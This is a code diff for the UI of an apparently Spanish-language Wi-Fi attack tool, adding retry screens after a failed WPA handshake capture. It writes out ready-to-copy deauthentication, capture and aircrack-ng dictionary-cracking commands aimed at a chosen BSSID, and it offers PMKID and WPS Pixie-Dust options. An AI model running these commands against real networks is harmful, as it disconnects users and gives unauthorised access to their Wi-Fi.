+            </div>
+          )}
+          <button disabled={!canStart} onClick={() => { setShowPreflight(false) }}
+            className="w-full py-3 rounded font-bold text-[10px] tracking-[0.25em] transition-all"
+            style={{
+              background: canStart ? 'rgba(255,68,68,0.10)' : 'rgba(255,255,255,0.02)',
+              border: `1px solid ${canStart ? 'rgba(255,68,68,0.40)' : 'rgba(255,255,255,0.05)'}`,
+              color: canStart ? 'rgba(255,110,110,0.92)' : 'rgba(255,255,255,0.12)',
+              cursor: canStart ? 'pointer' : 'not-allowed',
+              boxShadow: canStart ? '0 0 20px rgba(255,68,68,0.08)' : 'none',
+            }}
+            onMouseEnter={e => { if (canStart) (e.currentTarget as HTMLButtonElement).style.background = 'rgba(255,68,68,0.18)' }}
+            onMouseLeave={e => { if (canStart) (e.currentTarget as HTMLButtonElement).style.background = 'rgba(255,68,68,0.10)' }}>
+            {canStart ? `⚡ INICIAR ATAQUE${targetMac ? ` → ${targetMac}` : ' (BROADCAST)'}` : '⚠ SELECCIONA UNA INTERFAZ MONITOR'}
           </button>
         </div>
       </div>
     )
   }
 
-  // ══════════════════════════════════════════════════════════════════════════
-  // SCENE: transfer — animated beam from capture to decrypt
-  // ══════════════════════════════════════════════════════════════════════════
+  // ════════════════════════════════════════════════════════════════════════════
+  // SCENE: capture failed
+  // ════════════════════════════════════════════════════════════════════════════
+  if (captureFailed) {
+    return (
+      <div className="absolute inset-0 z-30 flex flex-col" style={{ background: 'rgba(3,6,10,0.98)', backdropFilter: 'blur(12px)' }}>
+        <button onClick={onFinish} className="absolute top-3 right-4 z-10 text-xs transition-colors"
+          style={{ color: 'rgba(255,68,68,0.30)' }}
+          onMouseEnter={e => ((e.currentTarget as HTMLButtonElement).style.color = 'rgba(255,68,68,0.75)')}
+          onMouseLeave={e => ((e.currentTarget as HTMLButtonElement).style.color = 'rgba(255,68,68,0.30)')}>ESC ✕</button>
+
+        {/* fail header */}
+        <div className="px-4 pt-4 pb-3 shrink-0" style={{ borderBottom: '1px solid rgba(255,68,68,0.09)' }}>
+          <div className="flex items-center gap-2.5">
+            <span className="text-2xl" style={{ filter: 'drop-shadow(0 0 16px #ff4444)' }}>✗</span>
+            <div>
+              <div className="text-[11px] font-bold tracking-[0.3em]" style={{ color: '#ff4444' }}>HANDSHAKE CAPTURE FAILED</div>
+              <div className="text-[8px] font-mono mt-0.5" style={{ color: 'rgba(255,68,68,0.40)' }}>
+                {wsAttempt}/{wsMaxAttempts} intentos — {captureFailMsg.slice(0, 80)}
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div className="flex-1 overflow-y-auto px-4 py-3 space-y-2">
+          {/* log */}
+          <div className="rounded-lg overflow-hidden" style={{ border: '1px solid rgba(255,68,68,0.12)' }}>
+            <button onClick={() => setShowFullLog(v => !v)}
+              className="w-full px-3 py-2 flex items-center gap-2 text-left"
+              style={{ background: 'rgba(255,68,68,0.04)', borderBottom: showFullLog ? '1px solid rgba(255,68,68,0.09)' : 'none' }}>
+              <span className="text-[8px] font-bold tracking-[0.2em]" style={{ color: 'rgba(255,68,68,0.55)' }}>DIAGNÓSTICO</span>
+              <span className="ml-auto text-[9px]" style={{ color: 'rgba(255,68,68,0.30)' }}>{showFullLog ? '▲' : '▼'} {wsLogs.length} líneas</span>
+            </button>
+            {showFullLog && (
+              <div className="p-2 max-h-48 overflow-y-auto font-mono text-[7.5px] space-y-0.5" style={{ background: 'rgba(0,0,0,0.40)' }}>
+                {wsLogs.map((l, i) => (
+                  <div key={i} style={{ color: l.startsWith('✗') || l.startsWith('✕') ? '#ff4444' : l.startsWith('✓') ? SG : 'rgba(255,68,68,0.40)' }}>{l}</div>
+                ))}
+              </div>
+            )}
+            {!showFullLog && wsLogs.length > 0 && (
+              <div className="px-3 py-2 font-mono text-[7.5px] space-y-0.5">
+                {wsLogs.slice(-5).map((l, i) => (
+                  <div key={i} style={{ color: l.startsWith('✗') ? '#ff4444' : 'rgba(255,68,68,0.40)' }}>{l}</div>
+                ))}
+              </div>
+            )}
+          </div>
+
+          {/* retry options */}
+          <div className="text-[8px] font-bold tracking-[0.2em] px-1" style={{ color: 'rgba(42,255,138,0.30)' }}>OPCIONES DE ATAQUE</div>
+
+          <div className="space-y-2">
+            {/* 1. Broadcast retry */}
+            <button onClick={() => resetCapture(null)}
+              className="w-full px-3 py-2.5 rounded text-left transition-all"
+              style={{ background: 'rgba(42,255,138,0.05)', border: '1px solid rgba(42,255,138,0.15)' }}
+              onMouseEnter={e => (e.currentTarget.style.background = 'rgba(42,255,138,0.10)')}
+              onMouseLeave={e => (e.currentTarget.style.background = 'rgba(42,255,138,0.05)')}>
+              <div className="flex items-center gap-2">
+                <span style={{ color: SG, fontSize: 12 }}>↺</span>
+                <div>
+                  <div className="text-[9px] font-bold" style={{ color: SG }}>REINTENTAR BROADCAST</div>
+                  <div className="text-[7.5px] mt-0.5" style={{ color: 'rgba(42,255,138,0.35)' }}>Deauth a todos los clientes del AP</div>
+                </div>
+                <div className="ml-auto font-mono text-[7px] text-right" style={{ color: 'rgba(42,255,138,0.25)' }}>
+                  aireplay-ng -0 {cfgDeauth}<br/>-a {network.bssid}
+                </div>
+              </div>
+            </button>
+
+            {/* 2. Targeted retry — show picker */}
+            {scannedClients.length > 0 && (
+              <div className="rounded-lg overflow-hidden" style={{ border: '1px solid rgba(0,229,255,0.15)' }}>
+                <div className="px-3 py-2" style={{ background: 'rgba(0,229,255,0.04)', borderBottom: '1px solid rgba(0,229,255,0.07)' }}>
+                  <div className="text-[9px] font-bold" style={{ color: '#00e5ff' }}>↺ REINTENTAR CON OBJETIVO</div>
+                  <div className="text-[7.5px] mt-0.5" style={{ color: 'rgba(0,229,255,0.35)' }}>Deauth dirigido a un cliente específico (más efectivo)</div>
+                </div>
+                <div className="p-2 space-y-1">
+                  {scannedClients.map(c => (
+                    <button key={c.mac} onClick={() => resetCapture(c.mac)}
+                      className="w-full flex items-center gap-2 px-2.5 py-1.5 rounded text-left transition-all"
+                      style={{ background: 'rgba(0,229,255,0.04)', border: '1px solid rgba(0,229,255,0.09)' }}
+                      onMouseEnter={e => (e.currentTarget.style.background = 'rgba(0,229,255,0.10)')}
+                      onMouseLeave={e => (e.currentTarget.style.background = 'rgba(0,229,255,0.04)')}>
+                      <span style={{ color: '#00e5ff', fontSize: 9 }}>◎</span>
+                      <span className="font-mono text-[8px]" style={{ color: 'rgba(0,229,255,0.70)' }}>{c.mac}</span>
+                      <span className="ml-auto text-[7px] font-mono" style={{ color: 'rgba(0,229,255,0.30)' }}>{c.power ?? '?'} dBm · {c.packets} pkts</span>
+                    </button>
+                  ))}
+                </div>
+              </div>
+            )}
+
+            {/* 3. Scan + retry */}
+            <button onClick={() => setShowPreflight(true)}
+              className="w-full px-3 py-2.5 rounded text-left transition-all"
+              style={{ background: 'rgba(255,136,0,0.05)', border: '1px solid rgba(255,136,0,0.15)' }}
+              onMouseEnter={e => (e.currentTarget.style.background = 'rgba(255,136,0,0.10)')}
+              onMouseLeave={e => (e.currentTarget.style.background = 'rgba(255,136,0,0.05)')}>
+              <div className="flex items-center gap-2">
+                <span style={{ color: '#ff8800', fontSize: 12 }}>📡</span>
+                <div>
+                  <div className="text-[9px] font-bold" style={{ color: '#ff8800' }}>ESCANEAR CLIENTES Y RECONFIGURAR</div>
+                  <div className="text-[7.5px] mt-0.5" style={{ color: 'rgba(255,136,0,0.45)' }}>Vuelve al setup para escanear dispositivos y ajustar parámetros</div>
+                </div>
+              </div>
+            </button>
+
+            {/* 4. PMKID fallback */}
+            <button onClick={() => { onHandoff(network); onFinish() }}
+              className="w-full px-3 py-2.5 rounded text-left transition-all"
+              style={{ background: 'rgba(0,229,255,0.04)', border: '1px solid rgba(0,229,255,0.12)' }}
+              onMouseEnter={e => (e.currentTarget.style.background = 'rgba(0,229,255,0.09)')}
+              onMouseLeave={e => (e.currentTarget.style.background = 'rgba(0,229,255,0.04)')}>
+              <div className="flex items-center gap-2">
+                <span style={{ color: '#00e5ff', fontSize: 12 }}>⬟</span>
+                <div>
+                  <div className="text-[9px] font-bold" style={{ color: '#00e5ff' }}>PMKID CAPTURE (sin clientes)</div>
+                  <div className="text-[7.5px] mt-0.5" style={{ color: 'rgba(0,229,255,0.40)' }}>hcxdumptool — no necesita clientes conectados</div>
+                </div>
+                <div className="ml-auto font-mono text-[7px] text-right" style={{ color: 'rgba(0,229,255,0.22)' }}>
+                  hcxdumptool<br/>-i {selectedInterface ?? '<iface>'}
+                </div>
+              </div>
+            </button>
+
+            {/* 5. WPS (if available) */}
+            {network.wps_enabled && !network.wps_locked && (
+              <button onClick={() => { onHandoff(network); onFinish() }}
+                className="w-full px-3 py-2.5 rounded text-left transition-all"
+                style={{ background: 'rgba(255,68,68,0.04)', border: '1px solid rgba(255,68,68,0.15)' }}
+                onMouseEnter={e => (e.currentTarget.style.background = 'rgba(255,68,68,0.10)')}
+                onMouseLeave={e => (e.currentTarget.style.background = 'rgba(255,68,68,0.04)')}>
+                <div className="flex items-center gap-2">
+                  <span style={{ color: '#ff4444', fontSize: 12 }}>⚡</span>
+                  <div>
+                    <div className="text-[9px] font-bold" style={{ color: '#ff4444' }}>WPS PIXIE-DUST</div>
+                    <div className="text-[7.5px] mt-0.5" style={{ color: 'rgba(255,68,68,0.40)' }}>WPS habilitado — ataque offline sin clientes</div>
+                  </div>
+                </div>
+              </button>
+            )}
+
+            {/* 6. Open terminal with ready commands */}
+            <button onClick={() => { onHandoff(network); onFinish() }}
+              className="w-full px-3 py-2.5 rounded text-left transition-all"
+              style={{ background: 'rgba(42,255,138,0.03)', border: '1px solid rgba(42,255,138,0.09)' }}
+              onMouseEnter={e => (e.currentTarget.style.background = 'rgba(42,255,138,0.07)')}
+              onMouseLeave={e => (e.currentTarget.style.background = 'rgba(42,255,138,0.03)')}>
+              <div className="flex items-center gap-2">
+                <span style={{ color: SG, fontSize: 12 }}>⌨</span>
+                <div className="flex-1">
+                  <div className="text-[9px] font-bold" style={{ color: SG }}>TERMINAL COMPLETO</div>
+                  <div className="text-[7.5px] mt-0.5" style={{ color: 'rgba(42,255,138,0.35)' }}>Control total con todos los comandos disponibles</div>
+                </div>
+              </div>
+              {/* ready-to-copy commands */}
+              <div className="mt-2 space-y-0.5 font-mono text-[7px] rounded p-2" style={{ background: 'rgba(0,0,0,0.35)', color: 'rgba(42,255,138,0.35)' }}>
+                <div>$ airmon-ng start {selectedInterface ?? 'wlan0'}</div>
+                <div>$ airodump-ng -c {network.channel ?? '?'} --bssid {network.bssid} -w /tmp/hs {selectedInterface ?? 'wlan0mon'}</div>
+                <div>$ aireplay-ng -0 {cfgDeauth} -a {network.bssid}{targetMac ? ` -c ${targetMac}` : ''} {selectedInterface ?? 'wlan0mon'}</div>
+                <div>$ aircrack-ng -b {network.bssid} -w /usr/share/wordlists/rockyou.txt /tmp/hs*.cap</div>
+              </div>
+            </button>
+          </div>
+        </div>
+      </div>
+    )
+  }
+
+  // ════════════════════════════════════════════════════════════════════════════
+  // SCENE: transfer
+  // ════════════════════════════════════════════════════════════════════════════
   if (scene === 'transfer') {
     return (
       <div className="absolute inset-0 z-30 flex flex-col items-center justify-center"
@@ -589,9 +983,7 @@ function AttackAnimation({ network, onFinish, onHandoff }: {
               {[0,1,2,3,4,5,6,7].map(i => (
                 <div key={i} style={{
                   width: 7, height: 7, borderRadius: '50%',
-                  background: i === (xferTick % 8) ? '#00e5ff'
-                    : i < (xferTick % 8) ? 'rgba(0,229,255,0.22)'
-                    : 'rgba(0,229,255,0.06)',
+                  background: i === (xferTick % 8) ? '#00e5ff' : i < (xferTick % 8) ? 'rgba(0,229,255,0.22)' : 'rgba(0,229,255,0.06)',
                   boxShadow: i === (xferTick % 8) ? '0 0 10px #00e5ff' : 'none',
                   transition: 'all 0.2s',
                 }} />
@@ -618,13 +1010,12 @@ function AttackAnimation({ network, onFinish, onHandoff }: {
     )
   }
 
-  // ══════════════════════════════════════════════════════════════════════════
-  // SCENE: decrypt — crack engine
-  // ══════════════════════════════════════════════════════════════════════════
+  // ════════════════════════════════════════════════════════════════════════════
+  // SCENE: decrypt
+  // ════════════════════════════════════════════════════════════════════════════
   if (scene === 'decrypt') {
     return (
-      <div className="absolute inset-0 z-30 flex flex-col"
-        style={{ background: 'rgba(3,6,10,0.97)', backdropFilter: 'blur(10px)' }}>
+      <div className="absolute inset-0 z-30 flex flex-col" style={{ background: 'rgba(3,6,10,0.97)', backdropFilter: 'blur(10px)' }}>
         <button onClick={onFinish} className="absolute top-3 right-4 z-10 text-xs transition-colors"
           style={{ color: 'rgba(42,255,138,0.22)' }}
           onMouseEnter={e => ((e.currentTarget as HTMLButtonElement).style.color = 'rgba(42,255,138,0.70)')}
@@ -644,7 +1035,6 @@ function AttackAnimation({ network, onFinish, onHandoff }: {
         </div>
 
         <div className="flex-1 overflow-y-auto px-4 py-3 space-y-3">
-          {/* Handshake card */}
           {handshake ? (
             <div className="rounded-lg p-3" style={{ background: 'rgba(0,229,255,0.04)', border: '1px solid rgba(0,229,255,0.18)' }}>
               <div className="flex items-center gap-2 mb-2">
@@ -669,17 +1059,48 @@ function AttackAnimation({ network, onFinish, onHandoff }: {
               </div>
             </div>
           ) : (
-            <div className="rounded-lg p-3 text-center" style={{ background: 'rgba(255,136,0,0.05)', border: '1px solid rgba(255,136,0,0.18)' }}>
-              <div className="text-[9px] font-bold tracking-wider" style={{ color: '#ff8800' }}>
-                {wlLoading ? 'BUSCANDO HANDSHAKES…' : 'SIN HANDSHAKE PARA ESTE BSSID'}
+            <div className="rounded-lg p-3" style={{ background: 'rgba(255,136,0,0.05)', border: '1px solid rgba(255,136,0,0.18)' }}>
+              <div className="text-center">
+                <div className="text-[9px] font-bold tracking-wider" style={{ color: '#ff8800' }}>
+                  {wlLoading ? 'BUSCANDO HANDSHAKES…' : 'SIN HANDSHAKE PARA ESTE BSSID'}
+                </div>
+                <div className="text-[8px] mt-1" style={{ color: 'rgba(255,136,0,0.40)' }}>La captura no obtuvo un handshake válido</div>
               </div>
-              <div className="text-[8px] mt-1" style={{ color: 'rgba(255,136,0,0.40)' }}>
-                Ejecuta una captura real desde la consola
-              </div>
+              {!wlLoading && (
+                <div className="mt-3 space-y-2">
+                  <button onClick={() => { setScene('capture'); resetCapture(null) }}
+                    className="w-full px-3 py-2 rounded text-left transition-all"
+                    style={{ background: 'rgba(42,255,138,0.06)', border: '1px solid rgba(42,255,138,0.18)' }}
+                    onMouseEnter={e => (e.currentTarget.style.background = 'rgba(42,255,138,0.12)')}
+                    onMouseLeave={e => (e.currentTarget.style.background = 'rgba(42,255,138,0.06)')}>
+                    <div className="flex items-center gap-2">
+                      <span style={{ color: SG, fontSize: 12 }}>↺</span>
+                      <div>
+                        <div className="text-[9px] font-bold" style={{ color: SG }}>REINTENTAR CAPTURA</div>
+                        <div className="text-[7px] mt-0.5" style={{ color: 'rgba(42,255,138,0.40)' }}>Deauth broadcast + esperar reconexión</div>
+                      </div>
+                    </div>
+                  </button>
+                  {scannedClients.length > 0 && (
+                    <button onClick={() => { setScene('capture'); resetCapture(scannedClients[0]?.mac ?? null) }}
+                      className="w-full px-3 py-2 rounded text-left transition-all"
+                      style={{ background: 'rgba(0,229,255,0.04)', border: '1px solid rgba(0,229,255,0.15)' }}
+                      onMouseEnter={e => (e.currentTarget.style.background = 'rgba(0,229,255,0.10)')}
+                      onMouseLeave={e => (e.currentTarget.style.background = 'rgba(0,229,255,0.04)')}>
+                      <div className="flex items-center gap-2">
+                        <span style={{ color: '#00e5ff', fontSize: 12 }}>⎯</span>
+                        <div>
+                          <div className="text-[9px] font-bold" style={{ color: '#00e5ff' }}>REINTENTAR CON CLIENTE</div>
+                          <div className="text-[7px] mt-0.5" style={{ color: 'rgba(0,229,255,0.40)' }}>Deauth dirigido a {scannedClients[0]?.mac?.slice(-8) ?? 'cliente'}</div>
+                        </div>
+                      </div>
+                    </button>
+                  )}
+                </div>
+              )}
             </div>
           )}
 
-          {/* Dictionary selector */}
           {handshake && crackState === 'idle' && (
             <div className="rounded-lg overflow-hidden" style={{ border: '1px solid rgba(42,255,138,0.10)' }}>
               <div className="px-3 py-2" style={{ background: 'rgba(42,255,138,0.04)', borderBottom: '1px solid rgba(42,255,138,0.07)' }}>
@@ -690,11 +1111,11 @@ function AttackAnimation({ network, onFinish, onHandoff }: {
                   <button key={t} onClick={() => setWlTab(t)}
                     className="flex-1 py-1.5 text-[8px] tracking-widest font-bold transition-all"
                     style={{
-                      color:        wlTab === t ? SG : 'rgba(42,255,138,0.25)',
-                      background:   wlTab === t ? 'rgba(42,255,138,0.06)' : 'transparent',
+                      color: wlTab === t ? SG : 'rgba(42,255,138,0.25)',
+                      background: wlTab === t ? 'rgba(42,255,138,0.06)' : 'transparent',
                       borderBottom: wlTab === t ? `1px solid ${SG}` : '1px solid transparent',
                     }}>
-                    {t === 'server' ? '📂  SERVIDOR' : '✏  RUTA CUSTOM'}
+                    {t === 'server' ? '📂 SERVIDOR' : '✏ RUTA CUSTOM'}
                   </button>
                 ))}
               </div>
@@ -718,9 +1139,7 @@ function AttackAnimation({ network, onFinish, onHandoff }: {
                           <span style={{ color: selectedWl === wl.path ? SG : 'rgba(42,255,138,0.22)', fontSize: 9 }}>
                             {selectedWl === wl.path ? '●' : '○'}
                           </span>
-                          <span className="text-[8px] font-mono truncate" style={{ color: selectedWl === wl.path ? SG : 'rgba(42,255,138,0.55)' }}>
-                            {wl.name}
-                          </span>
+                          <span className="text-[8px] font-mono truncate" style={{ color: selectedWl === wl.path ? SG : 'rgba(42,255,138,0.55)' }}>{wl.name}</span>
                         </div>
                         <span className="text-[7px] shrink-0 ml-2" style={{ color: 'rgba(42,255,138,0.28)' }}>{wl.size_mb} MB</span>
                       </button>
@@ -750,16 +1169,13 @@ function AttackAnimation({ network, onFinish, onHandoff }: {
                     background: wordlist ? 'rgba(42,255,138,0.10)' : 'rgba(255,255,255,0.02)',
                     border: `1px solid ${wordlist ? 'rgba(42,255,138,0.35)' : 'rgba(255,255,255,0.05)'}`,
                     color: wordlist ? SG : 'rgba(42,255,138,0.15)', cursor: wordlist ? 'pointer' : 'not-allowed',
-                  }}
-                  onMouseEnter={e => { if (wordlist) (e.currentTarget as HTMLButtonElement).style.background = 'rgba(42,255,138,0.18)' }}
-                  onMouseLeave={e => { if (wordlist) (e.currentTarget as HTMLButtonElement).style.background = 'rgba(42,255,138,0.10)' }}>
+                  }}>
                   {wordlist ? '▶ INICIAR CRACK' : 'SELECCIONA UN DICCIONARIO'}
                 </button>
               </div>
             </div>
           )}
 
-          {/* Cracking progress */}
           {crackState === 'cracking' && (
             <div className="rounded-lg overflow-hidden" style={{ border: '1px solid rgba(0,229,255,0.18)' }}>
               <div className="px-3 py-2 flex items-center gap-2"
@@ -769,8 +1185,7 @@ function AttackAnimation({ network, onFinish, onHandoff }: {
                 <span className="ml-auto text-[8px] font-mono" style={{ color: 'rgba(0,229,255,0.40)' }}>{crackProgress}%</span>
               </div>
               <div className="h-0.5" style={{ background: 'rgba(0,229,255,0.08)' }}>
-                <div className="h-full transition-all duration-500"
-                  style={{ width: `${crackProgress}%`, background: '#00e5ff', boxShadow: '0 0 6px #00e5ff' }} />
+                <div className="h-full transition-all duration-500" style={{ width: `${crackProgress}%`, background: '#00e5ff', boxShadow: '0 0 6px #00e5ff' }} />
               </div>
               <div className="p-2 h-32 overflow-y-auto font-mono text-[8px] space-y-0.5" style={{ background: 'rgba(0,0,0,0.40)' }}>
                 {crackLogs.length === 0 && <span className="animate-pulse" style={{ color: 'rgba(0,229,255,0.30)' }}>CONECTANDO…</span>}
@@ -786,7 +1201,6 @@ function AttackAnimation({ network, onFinish, onHandoff }: {
             </div>
           )}
 
-          {/* Password found */}
           {crackState === 'found' && foundPwd && (
             <div className="rounded-lg p-4 text-center space-y-2" style={{
               background: 'rgba(42,255,138,0.07)', border: `1px solid ${SG_RGBA}0.35)`, boxShadow: `0 0 32px ${SG_RGBA}0.12)`,
@@ -799,13 +1213,10 @@ function AttackAnimation({ network, onFinish, onHandoff }: {
               </div>
               <div className="text-[7px] tracking-widest" style={{ color: 'rgba(42,255,138,0.35)' }}>◈ SAVED TO CREDENTIALS</div>
               <button onClick={handleRetryCrack} className="text-[8px] mt-1 tracking-widest transition-all"
-                style={{ color: 'rgba(42,255,138,0.28)' }}
-                onMouseEnter={e => ((e.currentTarget as HTMLButtonElement).style.color = 'rgba(42,255,138,0.70)')}
-                onMouseLeave={e => ((e.currentTarget as HTMLButtonElement).style.color = 'rgba(42,255,138,0.28)')}>↺ OTRO DICCIONARIO</button>
+                style={{ color: 'rgba(42,255,138,0.28)' }}>↺ OTRO DICCIONARIO</button>
             </div>
           )}
 
-          {/* Crack failed */}
           {crackState === 'failed' && (
             <div className="rounded-lg p-3 text-center space-y-2" style={{
               background: 'rgba(255,68,68,0.04)', border: '1px solid rgba(255,68,68,0.20)',
@@ -814,9 +1225,7 @@ function AttackAnimation({ network, onFinish, onHandoff }: {
               <div className="text-[8px]" style={{ color: 'rgba(255,68,68,0.40)' }}>Diccionario agotado — prueba con otro.</div>
               <button onClick={handleRetryCrack}
                 className="w-full py-1.5 rounded font-bold text-[8px] tracking-widest transition-all mt-1"
-                style={{ background: 'rgba(42,255,138,0.07)', border: '1px solid rgba(42,255,138,0.20)', color: 'rgba(42,255,138,0.55)' }}
-                onMouseEnter={e => ((e.currentTarget as HTMLButtonElement).style.background = 'rgba(42,255,138,0.14)')}
-                onMouseLeave={e => ((e.currentTarget as HTMLButtonElement).style.background = 'rgba(42,255,138,0.07)')}>
+                style={{ background: 'rgba(42,255,138,0.07)', border: '1px solid rgba(42,255,138,0.20)', color: 'rgba(42,255,138,0.55)' }}>
                 ↺ OTRO DICCIONARIO
               </button>
             </div>
@@ -833,9 +1242,7 @@ function AttackAnimation({ network, onFinish, onHandoff }: {
           </button>
           <button onClick={onFinish}
             className="px-4 py-2 rounded text-[9px] tracking-widest transition-all"
-            style={{ border: '1px solid rgba(42,255,138,0.12)', color: 'rgba(42,255,138,0.35)' }}
-            onMouseEnter={e => { (e.currentTarget as HTMLButtonElement).style.color = 'rgba(42,255,138,0.70)'; (e.currentTarget as HTMLButtonElement).style.borderColor = 'rgba(42,255,138,0.30)' }}
-            onMouseLeave={e => { (e.currentTarget as HTMLButtonElement).style.color = 'rgba(42,255,138,0.35)'; (e.currentTarget as HTMLButtonElement).style.borderColor = 'rgba(42,255,138,0.12)' }}>
+            style={{ border: '1px solid rgba(42,255,138,0.12)', color: 'rgba(42,255,138,0.35)' }}>
             CLOSE
           </button>
         </div>
@@ -843,9 +1250,9 @@ function AttackAnimation({ network, onFinish, onHandoff }: {
     )
   }
 
-  // ══════════════════════════════════════════════════════════════════════════
-  // SCENE: capture — live topology animation
-  // ══════════════════════════════════════════════════════════════════════════
+  // ════════════════════════════════════════════════════════════════════════════
+  // SCENE: live capture topology
+  // ════════════════════════════════════════════════════════════════════════════
   return (
     <div className="absolute inset-0 z-30 flex flex-col" style={{ background: 'rgba(3,6,10,0.97)', backdropFilter: 'blur(10px)' }}>
 
@@ -855,15 +1262,19 @@ function AttackAnimation({ network, onFinish, onHandoff }: {
         ESC ✕
       </button>
 
-      {/* header — attempt counter + phase */}
+      {/* header */}
       <div className="flex flex-col items-center pt-4 pb-2 shrink-0">
         {wsAttempt > 1 && (
           <div className="flex items-center gap-2 mb-2 px-3 py-1 rounded-full"
             style={{ background: 'rgba(255,136,0,0.09)', border: '1px solid rgba(255,136,0,0.22)' }}>
-            <span className="text-[8px] font-bold tracking-widest" style={{ color: '#ff8800' }}>
-              INTENTO {wsAttempt}/{wsMaxAttempts}
-            </span>
+            <span className="text-[8px] font-bold tracking-widest" style={{ color: '#ff8800' }}>INTENTO {wsAttempt}/{wsMaxAttempts}</span>
             <span className="text-[8px] animate-pulse" style={{ color: '#ff8800' }}>●</span>
+          </div>
+        )}
+        {targetMac && (
+          <div className="flex items-center gap-2 mb-1.5 px-2 py-0.5 rounded-full"
+            style={{ background: 'rgba(0,229,255,0.06)', border: '1px solid rgba(0,229,255,0.18)' }}>
+            <span className="text-[7px] font-bold tracking-wider" style={{ color: '#00e5ff' }}>TARGET: {targetMac}</span>
           </div>
         )}
         <span className="text-3xl mb-1.5 transition-all" style={{ color: cur.color, filter: `drop-shadow(0 0 14px ${cur.color})` }}>{cur.icon}</span>
@@ -884,8 +1295,6 @@ function AttackAnimation({ network, onFinish, onHandoff }: {
       {/* topology SVG */}
       <div className="flex-1 relative mx-4 overflow-hidden">
         <svg className="w-full h-full" viewBox="0 0 220 180" preserveAspectRatio="xMidYMid meet">
-
-          {/* AP icon */}
           <g transform="translate(88,18)">
             <rect x="-18" y="-4" width="36" height="32" rx="4" fill="rgba(42,255,138,0.05)" stroke="rgba(42,255,138,0.12)" strokeWidth="0.6"/>
             <circle cx="0" cy="10" r="6" fill="none" stroke={SG} strokeWidth="1.2" opacity="0.8"/>
@@ -897,26 +1306,35 @@ function AttackAnimation({ network, onFinish, onHandoff }: {
             <text x="0" y="42" textAnchor="middle" fontSize="4.5" fill="rgba(42,255,138,0.25)" fontFamily="monospace">{network.ssid?.slice(0,12) ?? network.bssid.slice(-11)}</text>
           </g>
 
-          {/* Client icons */}
-          {clientPositions.map(({ cx, cy }, i) => {
+          {topologyPositions.map(({ cx, cy }, i) => {
             const isGone = gone.includes(i)
+            const mac    = topologyClients[i]
+            const isRealClient = scannedClients.length > 0
+            const isTargeted   = targetMac === mac
+            const nodeColor    = isTargeted ? '#ff8800' : isGone ? '#ff4444' : SG
             return (
               <g key={i} transform={`translate(${cx},${cy})`} style={{ opacity: isGone ? 0.15 : 1, transition: 'opacity 0.5s' }}>
-                <rect x="-14" y="-12" width="28" height="22" rx="3" fill="rgba(42,255,138,0.04)" stroke="rgba(42,255,138,0.09)" strokeWidth="0.6"/>
-                <rect x="-8" y="-9" width="16" height="11" rx="1.5" fill="none" stroke={isGone ? '#ff4444' : SG} strokeWidth="1" opacity="0.75"/>
+                <rect x="-14" y="-12" width="28" height="22" rx="3"
+                  fill={isTargeted ? 'rgba(255,136,0,0.06)' : 'rgba(42,255,138,0.04)'}
+                  stroke={isTargeted ? 'rgba(255,136,0,0.30)' : 'rgba(42,255,138,0.09)'} strokeWidth="0.6"/>
+                <rect x="-8" y="-9" width="16" height="11" rx="1.5" fill="none" stroke={nodeColor} strokeWidth="1" opacity="0.75"/>
                 <rect x="-6" y="-7" width="12" height="7" rx="0.5" fill={isGone ? 'rgba(255,68,68,0.08)' : 'rgba(42,255,138,0.06)'}/>
-                <line x1="-4" y1="2" x2="-5" y2="6" stroke={isGone ? '#ff4444' : SG} strokeWidth="1" opacity="0.5"/>
-                <line x1="4" y1="2" x2="5" y2="6" stroke={isGone ? '#ff4444' : SG} strokeWidth="1" opacity="0.5"/>
-                <line x1="-6" y1="6" x2="6" y2="6" stroke={isGone ? '#ff4444' : SG} strokeWidth="1" opacity="0.5"/>
-                <text x="0" y="14" textAnchor="middle" fontSize="4.5" fill={isGone ? 'rgba(255,68,68,0.4)' : 'rgba(42,255,138,0.30)'} fontFamily="monospace">CLI_{i+1}</text>
+                <line x1="-4" y1="2" x2="-5" y2="6" stroke={nodeColor} strokeWidth="1" opacity="0.5"/>
+                <line x1="4" y1="2" x2="5" y2="6" stroke={nodeColor} strokeWidth="1" opacity="0.5"/>
+                <line x1="-6" y1="6" x2="6" y2="6" stroke={nodeColor} strokeWidth="1" opacity="0.5"/>
+                {isRealClient ? (
+                  <text x="0" y="14" textAnchor="middle" fontSize="3.5" fill={isTargeted ? 'rgba(255,136,0,0.55)' : 'rgba(42,255,138,0.35)'} fontFamily="monospace">{mac.slice(-8)}</text>
+                ) : (
+                  <text x="0" y="14" textAnchor="middle" fontSize="4.5" fill="rgba(42,255,138,0.30)" fontFamily="monospace">CLI_{i+1}</text>
+                )}
                 {isGone && <text x="0" y="-16" textAnchor="middle" fontSize="10" fill="#ff4444" opacity="0.9">✕</text>}
+                {isTargeted && <text x="0" y="-17" textAnchor="middle" fontSize="7" fill="#ff8800" opacity="0.9">⚡</text>}
                 <line x1="0" y1="-12" x2={88-cx} y2={18-cy+4}
-                  stroke={isGone ? 'rgba(255,68,68,0.12)' : 'rgba(42,255,138,0.10)'} strokeWidth="0.5" strokeDasharray="3,3"/>
+                  stroke={isTargeted ? 'rgba(255,136,0,0.18)' : isGone ? 'rgba(255,68,68,0.12)' : 'rgba(42,255,138,0.10)'} strokeWidth="0.5" strokeDasharray="3,3"/>
               </g>
             )
           })}
 
-          {/* Attacker icon */}
           <g transform="translate(100,140)">
             <rect x="-16" y="-14" width="32" height="26" rx="3" fill="rgba(255,68,68,0.06)" stroke="rgba(255,68,68,0.16)" strokeWidth="0.6"/>
             <polygon points="0,-10 10,8 -10,8" fill="none" stroke="#ff4444" strokeWidth="1.2" opacity="0.85"/>
@@ -947,24 +1365,21 @@ function AttackAnimation({ network, onFinish, onHandoff }: {
         </svg>
       </div>
 
-      {/* log — real WS output or simulated phase labels */}
+      {/* WS log output */}
       <div className="mx-4 mb-2 rounded px-2.5 py-2 font-mono text-[8px] leading-relaxed shrink-0" style={{
         background: 'rgba(0,0,0,0.35)', border: '1px solid rgba(42,255,138,0.06)', maxHeight: 68, overflow: 'hidden',
       }}>
         {wsLogs.length > 0 ? (
           <>
             {wsLogs.slice(-4).map((l, i) => (
-              <div key={i} style={{ color: l.startsWith('✗') ? '#ff4444' : l.startsWith('✓') ? SG : 'rgba(42,255,138,0.55)' }}>
-                {l}
-              </div>
+              <div key={i} style={{ color: l.startsWith('✗') ? '#ff4444' : l.startsWith('✓') ? SG : 'rgba(42,255,138,0.55)' }}>{l}</div>
             ))}
             <div ref={wsLogsEndRef} />
           </>
         ) : (
